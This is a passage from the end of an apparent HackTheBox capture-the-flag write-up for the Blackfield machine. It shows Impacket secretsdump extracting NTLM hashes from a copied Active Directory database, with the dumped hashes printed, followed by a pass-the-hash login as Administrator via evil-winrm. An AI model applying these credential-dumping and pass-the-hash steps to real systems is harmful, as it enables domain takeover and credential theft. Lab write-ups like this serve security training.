style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Finally we can use <code>secretsdump</code> from Impacket to extract the hashes.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Searching for pekList, be patient</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Reading and decrypting hashes from ntds.dit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Again a PtH using <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">evil-winrm</a> with Administrator account.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Evil-WinRM shell v2.3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Establishing connection to remote endpoint</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; gc ../Desktop/root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">511fa0e63117cc3e746a523d0b5fd0b8</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/windows/">windows</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/recon/">recon</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/network/">network</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/exploit/">exploit</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/smb/">smb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/rpc/">rpc</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/winrm/">winrm</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/Admirer/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Admirer </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/Blunder/write-up/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Blunder </div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network enumeration</a></li><li><a href="#smb-enumeration" class="table-of-contents__link toc-highlight">SMB enumeration</a></li><li><a href="#rpc-enumeration" class="table-of-contents__link toc-highlight">RPC enumeration</a></li><li><a href="#privilege-escalation-of-machine--from-support-to-audit2020" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from support to audit2020</a></li><li><a href="#privilege-escalation-of-machine--from-audit2020-to-svc_backup" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from audit2020 to svc_backup</a></li><li><a href="#privilege-escalation-of-machine--from-svc_backup-to-root" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from svc_backup to root</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>